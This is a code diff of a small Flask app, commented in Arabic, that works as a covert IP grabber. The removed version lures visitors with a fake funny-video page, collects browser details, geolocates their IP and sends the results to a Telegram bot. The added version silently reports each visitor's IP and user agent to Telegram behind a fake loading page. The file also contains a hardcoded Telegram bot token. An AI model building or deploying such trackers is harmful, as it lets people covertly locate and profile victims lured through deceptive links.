@@ -3,73 +3,52 @@ import requests
 
 app = Flask(__name__)
 
-BOT_TOKEN = "8972111633:AAFyA1hbPsVzMwM1ZzduSCnufgtOwWJ6b9g"
-CHAT_ID = "@amoonah28"
+# إعدادات تيليجرام الصحيحة
+TELEGRAM_BOT_TOKEN = "8972111633:AAFyA1hbPsVzMwM1ZzduSCnufgtOwWJ6b9g"
+TELEGRAM_CHAT_ID = "960871923"
 
-HTML_PAGE = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Watch Video</title>
-    <meta property="og:title" content="مقطع ضحك مو طبيعي 😂" />
-    <meta property="og:description" content="اضغط للمشاهدة" />
-    <style>
-        body { background-color: #121212; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .btn { background: #ff0000; color: white; padding: 15px 30px; font-size: 18px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 20px;}
-    </style>
-</head>
-<body>
-    <h2>جاري تحميل الفيديو...</h2>
-    <script>
-        fetch('/collect', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                ua: navigator.userAgent,
-                platform: navigator.platform,
-                screen: window.screen.width + 'x' + window.screen.height,
-                lang: navigator.language
-            })
-        });
-        setTimeout(function() {
-            window.location.href = "https://www.youtube.com";
-        }, 1000);
-    </script>
-</body>
-</html>
-"""
-
-def send_telegram_alert(message):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
+def send_telegram_message(message):
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    payload = {
+        "chat_id": TELEGRAM_CHAT_ID,
+        "text": message,
+        "parse_mode": "Markdown"
+    }
     try:
-        requests.post(url, json=payload, timeout=3)
-    except:
-        pass
+        requests.post(url, json=payload, timeout=5)
+    except Exception as e:
+        print(f"Error sending telegram message: {e}")
 
 @app.route('/')
 def index():
-    return render_template_string(HTML_PAGE)
-
-@app.route('/collect', methods=['POST'])
-def collect():
+    # جمع بيانات الجهاز والمتصفح
+    user_agent = request.headers.get('User-Agent', 'Unknown')
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    data = request.json or {}
-    try:
-        geo = requests.get(f"https://ipinfo.io/{ip}/json", timeout=3).json()
-    except:
-        geo = {}
-
-    msg = (
-        f"🚨 **دخل شخص جديد!**\n\n"
-        f"🌐 **الآيب:** `{ip}`\n"
-        f"📍 **الموقع:** {geo.get('city', 'Unknown')}, {geo.get('country', 'Unknown')}\n"
-        f"🏢 **مزود الخدمة:** {geo.get('org', 'Unknown')}\n"
-        f"💻 **النظام:** {data.get('platform')}\n"
-        f"📱 **المتصفح:** `{data.get('ua')}`"
-    )
-    send_telegram_alert(msg)
-    return '', 204
+    
+    # إرسال التنبيه فوراً لتيليجرام
+    msg = f"🚨 *زيارة جديدة للموقع!*\n\n🌐 *IP:* `{ip}`\n💻 *User-Agent:* `{user_agent}`"
+    send_telegram_message(msg)
+    
+    # تصميم الصفحة اللي تظهر للزوار
+    html_content = """
+    <!DOCTYPE html>
+    <html lang="ar" dir="rtl">
+    <head>
+        <meta charset="UTF-8">
+        <title>جاري التحميل...</title>
+        <style>
+            body { background-color: #0f172a; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 100px; }
+            .loader { border: 6px solid #1e293b; border-top: 6px solid #38bdf8; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        </style>
+    </head>
+    <body>
+        <h2>جاري تحضير الصفحة، يرجى الانتظار...</h2>
+        <div class="loader"></div>
+    </body>
+    </html>
+    """
+    return render_template_string(html_content)
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=80)
+    app.run(host='0.0.0.0', port=5000)
